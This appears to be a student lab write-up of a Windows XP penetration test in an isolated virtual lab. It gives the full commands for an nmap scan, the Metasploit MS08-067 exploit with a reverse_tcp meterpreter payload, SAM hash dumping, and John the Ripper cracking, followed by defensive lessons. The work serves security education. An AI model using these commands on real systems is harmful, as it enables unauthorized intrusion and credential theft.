# **Task-04: Windows XP Exploitation & Password Hash Cracking**

## **⚠️ Disclaimer: For Educational Purposes Only**

**This report documents a controlled security exercise performed in a strictly isolated, self-contained lab environment.**
*   **All activities were conducted on my own virtual machines, which I own and operate.**
*   **The target operating system (Windows XP) is end-of-life, intentionally vulnerable, and has no connection to any real network, production system, or internet-facing service.**
*   **No actual user data was compromised. The "victim" machine was created solely for this educational demonstration.**

**The purpose of this project is strictly educational and defensive. It aims to:**
*   Understand the process of a complete attack chain from reconnaissance to credential access.
*   Demonstrate the critical dangers of using outdated, unpatched software and weak passwords.
*   Highlight the importance of robust patch management, strong credential policies, and modern security controls.

**Unauthorized testing, exploitation, or access of systems you do not own is illegal and unethical. This knowledge is to be used responsibly for defensive security, penetration testing with explicit permission, and improving organizational security posture.**

---

## **Overview**

This task involved a full penetration testing cycle against a legacy Windows XP system. The objective was to exploit a known vulnerability to gain remote access, extract password hashes from the system's SAM database, and successfully crack them to obtain plaintext credentials. This demonstrates a critical attack vector where initial access leads to credential compromise.

## **Lab Environment**

*   **Attacker Machine:** Kali Linux 2023.4 (Virtual Machine)
    *   **IP Address:** `192.168.134.129`
*   **Target Machine:** Windows XP Professional SP2 (Virtual Machine - **Intentionally vulnerable and isolated**)
    *   **IP Address:** `192.168.134.133`
    *   **Firewall Status:** Disabled (Required for this lab exercise)
*   **Network:** Both VMs connected to a virtual "Host-Only" network, ensuring no external connectivity.

## **Tools Used**

*   **Reconnaissance:** `Nmap`
*   **Exploitation Framework:** `Metasploit Framework (msfconsole)`
*   **Exploit Module:** `exploit/windows/smb/ms08_067_netapi`
*   **Payload:** `windows/meterpreter/reverse_tcp`
*   **Post-Exploitation:** `Meterpreter` (for `hashdump`)
*   **Password Cracking:** `John the Ripper`

---

## **Methodology & Detailed Steps**

### **Step 1: Reconnaissance with Nmap**

The first step was to discover open ports and running services on the target to identify potential entry points.

*   **Command Executed:**
    ```bash
    nmap -sV -p- 192.168.134.133
    ```
*   **Flags Explained:**
    *   `-sV`: Service version detection.
    *   `-p-`: Scan all 65,535 TCP ports.
*   **Finding:** The scan revealed open ports, notably port **445/tcp (microsoft-ds)**, indicating the Server Message Block (SMB) service was running. This is a common vector for exploitation on older Windows systems.

**Screenshot 1: Nmap scan results showing open ports on the Windows XP target.**
*(Insert your screenshot of the Nmap output here)*

---

### **Step 2: Vulnerability Research**

With the SMB service identified, the next step was to find known, public exploits for this service on Windows XP.

*   **Command Executed:**
    ```bash
    searchsploit ms08-067
    ```
*   **Finding:** The `searchsploit` command confirmed the existence of a public exploit for **MS08-067**, a critical remote code execution vulnerability in the Windows Server service.

**Screenshot 2: SearchSploit results showing the MS08-067 exploit module.**
*(Insert your screenshot of the searchsploit output here)*

---

### **Step 3: Gaining Access with Metasploit**

The Metasploit Framework was used to leverage the discovered vulnerability and gain a remote shell on the target.

*   **Commands Executed:**
    ```bash
    msfconsole
    use exploit/windows/smb/ms08_067_netapi
    set RHOSTS 192.168.134.133
    set LHOST 192.168.134.129
    set PAYLOAD windows/meterpreter/reverse_tcp
    exploit
    ```
*   **Result:** The exploit was successful, and a `meterpreter` session was opened, providing a powerful interactive command shell on the Windows XP system.

**Screenshot 3: Successful Metasploit exploitation resulting in a Meterpreter session.**
*(Insert your screenshot of the successful `exploit` command and meterpreter prompt here)*

---

### **Step 4: Post-Exploitation & Hash Dumping**

With system access established, the next goal was to extract password hashes for cracking.

*   **Command Executed from Meterpreter:**
    ```bash
    hashdump
    ```
*   **Result:** The `hashdump` command extracted the LM and NTLM password hashes for all local users from the SAM database. These hashes were saved to a file (`hashes.txt`) on the Kali machine for offline cracking.

**Screenshot 4: Output of the `hashdump` command showing the captured LM and NTLM hashes.**
*(Insert your screenshot of the hashdump output here)*

---

### **Step 5: Password Cracking with John the Ripper**

The final step was to crack the extracted hashes to obtain the plaintext passwords.

*   **Initial Attempt (NTLM):**
    ```bash
    john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
    *   **Result:** The crack attempt failed. This can happen if the password is not in the wordlist or is strong enough to resist a dictionary attack.

*   **Successful Attempt (LM):**
    ```bash
    john --format=LM --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
    *   **Result:** **Success!** The LM hash was cracked instantly. This is because the LM hashing algorithm is cryptographically weak and breaks passwords into two 7-character halves, making it highly vulnerable to fast cracking.

**Screenshot 5: John the Ripper successfully cracking the LM hash.**
*(Insert your screenshot of John showing the cracked password here)*

---

## **Key Findings & Security Implications**

1.  **Criticality of Patch Management:** The entire attack was possible due to an **unpatched vulnerability from 2008**. This underscores the non-negotiable importance of a robust and timely patch management policy. MS08-067 has a patch available that completely prevents this exploit.
2.  **Weakness of Legacy Protocols:** The success in cracking the **LM hash** highlights the danger of using outdated cryptographic protocols. Modern Windows systems disable LM hashing by default due to its severe weaknesses. This attack would fail against a modern, properly configured Windows 10/11 system using only NTLMv2 or Kerberos.
3.  **The Attack Chain:** This exercise demonstrates a classic cyber kill chain:
    *   **Reconnaissance** (Nmap Scan)
    *   **Weaponization** (Selecting MS08-067 exploit)
    *   **Delivery & Exploitation** (Metasploit execution)
    *   **Installation** (Meterpreter payload)
    *   **Command & Control** (Reverse TCP connection)
    *   **Actions on Objectives** (Hash dumping and cracking)
4.  **Defense in Depth:** Mitigation requires multiple layers of defense:
    *   **Network Layer:** Firewalls and network segmentation to restrict SMB traffic.
    *   **Host Layer:** Regular patching, disabling unnecessary services (like SMB if not needed), and using modern OS versions.
    *   **Credential Layer:** Enforcing strong, complex passwords that are resistant to dictionary attacks.

## **Conclusion**

This task provided a practical, end-to-end demonstration of a common attack vector targeting legacy systems. By understanding each step—from initial scanning to final password cracking—we can better appreciate the tactics, techniques, and procedures (TTPs) used by adversaries. This knowledge is fundamental for roles in penetration testing, blue team defense, and incident response, as it directly informs how we build, monitor, and defend modern networks against real-world threats.

The key takeaway is that security is a continuous process. Vigilance in patching, system hardening, and user education remains the most effective defense against these types of exploits.
